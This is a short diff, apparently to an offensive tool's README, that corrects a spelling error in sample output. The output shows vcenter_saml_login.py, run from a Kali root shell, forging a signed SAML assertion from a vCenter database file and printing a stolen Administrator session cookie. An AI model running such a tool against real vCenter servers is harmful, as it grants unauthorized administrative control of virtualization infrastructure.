@@ -20,7 +20,7 @@ root@kali:~/vcenter# python3 vcenter_saml_login.py -p data.mdb -t 10.0.100.200
 [*] Generating SAML assertion
 [*] Signing the SAML assertion
 [*] Attempting to log into vCenter with the signed SAML request
-[+] Successfuly obtained Administrator cookie for 10.0.100.200!
+[+] Successfully obtained Administrator cookie for 10.0.100.200!
 [+] Cookie: VSPHERE-UI-JSESSIONID=06D1630719B4DE33A4CE653458911640
 ```
 
